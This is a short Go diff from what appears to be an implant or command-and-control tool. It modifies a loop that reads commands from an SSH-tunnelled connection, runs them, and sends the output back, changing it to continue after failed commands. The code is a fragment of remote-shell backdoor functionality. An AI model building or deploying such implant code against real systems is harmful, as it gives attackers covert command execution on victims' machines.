@@ -16,6 +16,7 @@ import (
 	//Fixes
 	"time"
 	"encoding/json"
+	//"fmt"
 )
 /*
 This JSON Object definition is needed in some Implants Modules to decode parameters
@@ -91,7 +92,6 @@ func listenSSH(sshconn *ssh.Client,l net.Listener){
 		}
 
 		handleConnection(conn)
-
 		return
 	}
 }
@@ -103,6 +103,7 @@ func handleConnection(c net.Conn) {
 	for{
 		order, err := r.ReadString('\n')
 		if nil != err {
+			fmt.Println("Read Error: "+err.Error())
 			return
 		}
 
@@ -118,7 +119,9 @@ func handleConnection(c net.Conn) {
 
 		err = cmd.Run()
 		if err != nil {
-			return
+			//Continue since typing wrong commands will break the pipe
+			//return
+			continue
 		}
 
 		c.Write([]byte(outbuf.String()))
